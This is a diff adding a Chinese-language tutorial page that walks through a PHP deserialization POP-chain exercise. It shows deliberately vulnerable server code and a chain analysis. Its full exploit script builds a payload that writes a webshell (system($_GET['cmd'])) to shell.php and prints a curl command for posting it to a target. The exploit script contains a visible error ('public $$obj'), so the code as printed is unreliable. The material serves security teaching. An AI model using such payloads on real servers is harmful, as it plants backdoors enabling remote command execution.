@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>例题2 - PHP反序列化学习</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    pre {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-size: 14px;
+    }
+    code {
+      font-family: 'Courier New', monospace;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    .output-block {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 font-mono">
+  
+  <!-- Header -->
+  <header class="border-b border-gray-700 bg-gray-950/50 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center gap-4">
+        <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+          <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          <span>返回首页</span>
+        </a>
+        <div class="flex-1">
+          <h1 class="text-xl font-bold text-white">例题2：A/B类联合构造写入文件</h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-7xl mx-auto px-6 py-8">
+    
+    <!-- 题目描述 -->
+    <section class="mb-12 animate-fade-in">
+      <div class="bg-pink-900/20 border border-pink-800 rounded-xl p-6 mb-8">
+        <div class="flex items-center gap-3 mb-4">
+          <i data-lucide="file-text" class="w-6 h-6 text-pink-400"></i>
+          <h2 class="text-xl font-bold text-pink-300">题目描述</h2>
+        </div>
+        <p class="text-gray-300">
+          服务端存在自定义 <code class="text-yellow-300">A</code>、<code class="text-yellow-300">B</code> 两个类，
+          反序列化入口接收POST传参的 <code class="text-yellow-300">data</code> 值，无任何过滤与校验。
+          要求利用反序列化漏洞构造POP链，调用 <code class="text-yellow-300">file_put_contents()</code> 
+          函数在服务端写入一句话木马 <code class="text-yellow-300">shell.php</code>。
+        </p>
+      </div>
+    </section>
+
+    <!-- 服务端源码 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.1s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="code" class="w-6 h-6 text-green-400"></i>
+        服务端源码
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="code-block">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">A</span>
+{
+    <span class="text keyword">public</span> $<span class="text variable">path</span>;
+    <span class="text keyword">public</span> $<span class="text variable">content</span>;
+
+    <span class="text comment">// 构造方法：初始化属性</span>
+    <span class="text keyword">public function</span> <span class="text function">__construct</span>()
+    {
+        <span class="text variable">$this</span>->path = <span class="text string">"1919810.txt"</span>;
+        <span class="text variable">$this</span>->content = <span class="text string">"Nothing useful"</span>;
+    }
+
+    <span class="text comment">// 字符串方法：对象被当作字符串时触发</span>
+    <span class="text keyword">public function</span> <span class="text function">__toString</span>()
+    {
+        <span class="text function">echo</span> <span class="text string">"now is a string\n"</span>;
+        <span class="text comment">// 访问path属性的子path，触发__get</span>
+        <span class="text keyword">return</span> (<span class="text variable">$this</span>->path)->path . <span class="text variable">$this</span>->content;
+    }
+
+    <span class="text comment">// 获取不可访问属性时触发</span>
+    <span class="text keyword">public function</span> <span class="text function">__get</span>(<span class="text variable">$name</span>)
+    {
+        <span class="text function">echo</span> <span class="text string">"now is a get\n"</span>;
+        <span class="text keyword">return</span> <span class="text variable">$name</span>;
+    }
+}
+
+<span class="text keyword">class</span> <span class="text class-name">B</span>
+{
+    <span class="text keyword">public</span> $<span class="text variable">name</span>;
+    <span class="text keyword">public</span> $<span class="text variable">id</span>;
+    <span class="text keyword">public</span> $<span class="text variable">obj</span>;
+
+    <span class="text comment">// 反序列化时触发：松散比较name和id</span>
+    <span class="text keyword">public function</span> <span class="text function">__wakeup</span>()
+    {
+        <span class="text keyword">if</span> (<span class="text variable">$this</span>->name == <span class="text variable">$this</span>->id) {
+            <span class="text function">echo</span> <span class="text string">"Why your name is id?\n"</span>;
+        } <span class="text keyword">else</span> {
+            <span class="text function">echo</span> <span class="text string">"ok\n"</span>;
+        }
+    }
+
+    <span class="text comment">// 获取不可访问属性时触发：核心危险操作</span>
+    <span class="text keyword">public function</span> <span class="text function">__get</span>(<span class="text variable">$name</span>)
+    {
+        <span class="text function">echo</span> <span class="text string">"now is get\n"</span>;
+        <span class="text comment">// 写入文件：参数为obj的path和content，可控</span>
+        <span class="text function">file_put_contents</span>((<span class="text variable">$this</span>->obj)->path, (<span class="text variable">$this</span>->obj)->content);
+        <span class="text keyword">return</span> (<span class="text variable">$this</span>->obj)->name;
+    }
+}
+
+<span class="text comment">// 高亮显示源码，无实际防护</span>
+<span class="text function">highlight_file</span>(<span class="text variable">__FILE__</span>);
+<span class="text comment">// 反序列化入口：接收POST参数data，无过滤</span>
+<span class="text function">unserialize</span>(<span class="text variable">$_POST</span>[<span class="text string">'data'</span>]);
+?></code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- 漏洞分析 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.2s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="search" class="w-6 h-6 text-purple-400"></i>
+        漏洞分析
+      </h2>
+
+      <div class="bg-purple-900/20 border border-purple-800 rounded-xl p-6">
+        <h3 class="text-lg font-bold text-purple-300 mb-4">POP链构造思路（反向回溯法）</h3>
+        
+        <div class="space-y-6">
+          
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-red-900/30 rounded-full flex items-center justify-center text-red-400 font-bold flex-shrink-0">1</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">确定目标危险函数</h4>
+              <p class="text-gray-400 mt-1">
+                目标函数：<code class="text-red-300">file_put_contents(($this->obj)->path, ($this->obj)->content)</code>
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                在 <code class="text-red-300">B::__get()</code> 中定义
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">2</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">找到B::__get()触发条件</h4>
+              <p class="text-gray-400 mt-1">
+                触发方式：访问 <code class="text-yellow-300">B</code> 对象<strong>不存在的属性</strong>
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                需要 <code class="text-orange-300">$b->name = $a</code>，然后访问 <code class="text-orange-300">$a->path->path</code>
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-yellow-900/30 rounded-full flex items-center justify-center text-yellow-400 font-bold flex-shrink-0">3</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">找到A::__toString()触发条件</h4>
+              <p class="text-gray-400 mt-1">
+                触发方式：对象被当作字符串，如 <code class="text-yellow-300">$b->name == $b->id</code>（松散比较）
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                如果 <code class="text-yellow-300">$name</code> 是对象，会调用 <code class="text-yellow-300">__toString()</code>
+              </p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4">
+            <div class="w-10 h-10 bg-green-900/30 rounded-full flex items-center justify-center text-green-400 font-bold flex-shrink-0">4</div>
+            <div class="flex-1">
+              <h4 class="text-white font-bold">找到B::__wakeup()入口</h4>
+              <p class="text-gray-400 mt-1">
+                触发方式：<code class="text-green-300">unserialize()</code> 时自动触发
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                设置 <code class="text-green-300">$b2->name = $a2</code>（对象），<code class="text-green-300">$b2->id = "2"</code>（字符串）
+              </p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- 调用链图 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.3s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="git-branch" class="w-6 h-6 text-cyan-400"></i>
+        调用链图解
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="flex flex-wrap items-center justify-center gap-2 text-center mb-6">
+          
+          <div class="bg-blue-900/30 border border-blue-700 rounded-lg px-3 py-2">
+            <p class="text-blue-400 font-bold text-sm">unserialize()</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-4 h-4 text-gray-600"></i>
+
+          <div class="bg-orange-900/30 border border-orange-700 rounded-lg px-3 py-2">
+            <p class="text-orange-400 font-bold text-sm">__wakeup()</p>
+            <p class="text-xs text-gray-400">B对象</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-4 h-4 text-gray-600"></i>
+
+          <div class="bg-purple-900/30 border border-purple-700 rounded-lg px-3 py-2">
+            <p class="text-purple-400 font-bold text-sm">__toString()</p>
+            <p class="text-xs text-gray-400">A对象</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-4 h-4 text-gray-600"></i>
+
+          <div class="bg-yellow-900/30 border border-yellow-700 rounded-lg px-3 py-2">
+            <p class="text-yellow-400 font-bold text-sm">__get()</p>
+            <p class="text-xs text-gray-400">B对象访问path</p>
+          </div>
+
+          <i data-lucide="arrow-right" class="w-4 h-4 text-gray-600"></i>
+
+          <div class="bg-red-900/30 border border-red-700 rounded-lg px-3 py-2">
+            <p class="text-red-400 font-bold text-sm">file_put()</p>
+            <p class="text-xs text-gray-400">写入文件</p>
+          </div>
+
+        </div>
+
+        <div class="bg-gray-900/50 rounded-lg p-4">
+          <p class="text-gray-400 text-sm">
+            <span class="text-yellow-400">关键点：</span>
+            <code class="text-green-300">$b2->name($a2对象) == $b2->id("2"字符串)</code> 松散比较触发 <code class="text-green-300">__toString()</code>
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 解题步骤 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.4s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="list-ordered" class="w-6 h-6 text-orange-400"></i>
+        解题步骤
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <ol class="space-y-6">
+          
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">1</div>
+            <div>
+              <h4 class="text-white font-bold">创建B1对象（最内层）</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">$b1->obj = $a1</code>（A对象），用于调用 <code class="text-yellow-300">file_put_contents()</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">2</div>
+            <div>
+              <h4 class="text-white font-bold">创建A1对象</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">$a1->path = "shell.php"</code>，<code class="text-yellow-300">$a1->content = "<?php ..."</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">3</div>
+            <div>
+              <h4 class="text-white font-bold">创建A2对象（中间层）</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">$a2->path = $b1</code>（B1对象），用于触发 <code class="text-yellow-300">B::__get()</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">4</div>
+            <div>
+              <h4 class="text-white font-bold">创建B2对象（最外层）</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                设置 <code class="text-yellow-300">$b2->name = $a2</code>（对象），<code class="text-yellow-300">$b2->id = "2"</code>（字符串）
+              </p>
+              <p class="text-gray-500 text-sm mt-1">
+                松散比较触发 <code class="text-yellow-300">A::__toString()</code>
+              </p>
+            </div>
+          </li>
+
+          <li class="flex items-start gap-4">
+            <div class="w-8 h-8 bg-orange-900/30 rounded-full flex items-center justify-center text-orange-400 font-bold flex-shrink-0">5</div>
+            <div>
+              <h4 class="text-white font-bold">序列化并POST提交</h4>
+              <p class="text-gray-400 text-sm mt-1">
+                反序列化时会依次触发 <code class="text-yellow-300">__wakeup()</code> → <code class="text-yellow-300">__toString()</code> → <code class="text-yellow-300">__get()</code> → <code class="text-yellow-300">file_put_contents()</code>
+              </p>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+    <!-- EXP脚本 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.5s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="rocket" class="w-6 h-6 text-red-400"></i>
+        完整EXP脚本
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="code-block mb-4">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text comment">// 例题2 EXP: A/B类联合构造触发file_put_contents</span>
+
+<span class="text keyword">class</span> <span class="text class-name">A</span> {
+    <span class="text keyword">public</span> $<span class="text variable">path</span>;
+    <span class="text keyword">public</span> $<span class="text variable">content</span>;
+}
+
+<span class="text keyword">class</span> <span class="text class-name">B</span> {
+    <span class="text keyword">public</span> $<span class="text variable">name</span>;
+    <span class="text keyword">public</span> $<span class="text variable">id</span>;
+    <span class="text keyword">public</span> $<span class="text variable">$obj</span>;
+}
+
+<span class="text comment">// Step 1: 创建A1对象，用于写入文件内容</span>
+<span class="text variable">$a1</span> = <span class="text keyword">new</span> <span class="text class-name">A</span>();
+<span class="text variable">$a1</span>->path = <span class="text string">"shell.php"</span>;                           <span class="text comment">// 写入的文件名</span>
+<span class="text variable">$a1</span>->content = <span class="text string">"<?php system(\$_GET['cmd']);"</span>;      <span class="text comment">// 木马内容</span>
+
+<span class="text comment">// Step 2: 创建B1对象，用于触发__get</span>
+<span class="text variable">$b1</span> = <span class="text keyword">new</span> <span class="text class-name">B</span>();
+<span class="text variable">$b1</span>->obj = <span class="text variable">$a1</span>;                                     <span class="text comment">// 关联A1对象</span>
+<span class="text variable">$b1</span>->id = <span class="text string">"1"</span>;
+
+<span class="text comment">// Step 3: 创建A2对象，用于触发__toString</span>
+<span class="text variable">$a2</span> = <span class="text keyword">new</span> <span class="text class-name">A</span>();
+<span class="text variable">$a2</span>->path = <span class="text variable">$b1</span>;                                      <span class="text comment">// 关键！赋值为B1对象</span>
+<span class="text variable">$a2</span>->content = <span class="text string">"114514"</span>;                               <span class="text comment">// 填充属性，无实际作用</span>
+
+<span class="text comment">// Step 4: 创建B2对象，用于触发__wakeup</span>
+<span class="text variable">$b2</span> = <span class="text keyword">new</span> <span class="text class-name">B</span>();
+<span class="text variable">$b2</span>->name = <span class="text variable">$a2</span>;                                      <span class="text comment">// 对象，松散比较触发__toString</span>
+<span class="text variable">$b2</span>->id = <span class="text string">"2"</span>;                                       <span class="text comment">// 字符串，与name类型不同</span>
+
+<span class="text comment">// Step 5: 序列化并URL编码</span>
+<span class="text variable">$payload</span> = <span class="text function">urlencode</span>(<span class="text function">serialize</span>(<span class="text variable">$b2</span>));
+
+<span class="text function">echo</span> <span class="text string">"Payload:\n"</span>;
+<span class="text function">echo</span> <span class="text variable">$payload</span>;
+<span class="text function">echo</span> <span class="text string">"\n\n使用方法：\n"</span>;
+<span class="text function">echo</span> <span class="text string">"curl -X POST http://target.com/index.php -d 'data="</span> . <span class="text variable">$payload</span> . <span class="text string">"'\n"</span>;</code></pre>
+        </div>
+
+        <div class="bg-yellow-900/20 border border-yellow-800 rounded-lg p-4">
+          <div class="flex items-center gap-2 mb-2">
+            <i data-lucide="terminal" class="w-5 h-5 text-yellow-400"></i>
+            <span class="text-yellow-400 font-bold">执行流程</span>
+          </div>
+          <div class="output-block text-sm">
+<pre><code>unserialize($b2)
+  └─> __wakeup(): $b2->name(A对象) != $b2->id("2"字符串)，松散比较触发 __toString()
+        └─> A::__toString(): return ($this->path即$b1)->path
+              └─> B::__get("path"): file_put_contents($a1->path, $a1->content)
+                    └─> shell.php 被写入!</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 两道题对比 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.6s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="compare" class="w-6 h-6 text-blue-400"></i>
+        两道例题对比
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 overflow-x-auto">
+        <table class="w-full text-sm">
+          <thead>
+            <tr class="border-b border-gray-700 text-gray-400">
+              <th class="text-left py-3 px-4">对比项</th>
+              <th class="text-left py-3 px-4">例题1</th>
+              <th class="text-left py-3 px-4">例题2</th>
+            </tr>
+          </thead>
+          <tbody class="text-gray-300">
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4">利用类</td>
+              <td class="py-3 px-4 text-green-400">User（单类）</td>
+              <td class="py-3 px-4 text-blue-400">A/B（两类配合）</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4">POP链长度</td>
+              <td class="py-3 px-4">2层（__destruct→__toString）</td>
+              <td class="py-3 px-4">4层（__wakeup→__toString→__get→file_put）</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4">触发入口</td>
+              <td class="py-3 px-4">__destruct()</td>
+              <td class="py-3 px-4">__wakeup()</td>
+            </tr>
+            <tr class="border-b border-gray-700/50">
+              <td class="py-3 px-4">危险函数</td>
+              <td class="py-3 px-4 text-red-400">system()</td>
+              <td class="py-3 px-4 text-red-400">file_put_contents()</td>
+            </tr>
+            <tr>
+              <td class="py-3 px-4">关键技巧</td>
+              <td class="py-3 px-4">对象赋值触发__toString</td>
+              <td class="py-3 px-4">松散比较(==)触发__toString</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Navigation -->
+    <div class="flex justify-between items-center mt-12 pt-8 border-t border-gray-800">
+      <a href="example1.html" class="text-gray-400 hover:text-white flex items-center gap-2">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+        <span>上一节：例题1</span>
+      </a>
+      <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+        <span>返回首页</span>
+        <i data-lucide="home" class="w-5 h-5"></i>
+      </a>
+    </div>
+
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
